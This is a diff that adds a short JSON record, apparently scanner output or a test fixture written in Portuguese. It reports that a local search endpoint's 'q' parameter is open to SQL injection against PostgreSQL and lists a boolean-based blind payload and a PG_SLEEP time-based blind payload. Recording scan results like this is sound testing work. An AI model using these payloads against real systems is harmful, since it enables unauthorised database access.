@@ -1,0 +1,10 @@
+{
+  "url": "http://127.0.0.1:3000/busca?q=1",
+  "parametro": "q",
+  "injetavel": true,
+  "sgbd": "PostgreSQL",
+  "tecnicas": [
+    { "tipo": "boolean-based blind", "titulo": "AND boolean-based blind - WHERE or HAVING clause", "payload": "q=1 AND 5871=5871" },
+    { "tipo": "time-based blind", "titulo": "PostgreSQL > 8.1 AND time-based blind", "payload": "q=1 AND 1234=(SELECT 1234 FROM PG_SLEEP(5))" }
+  ]
+}
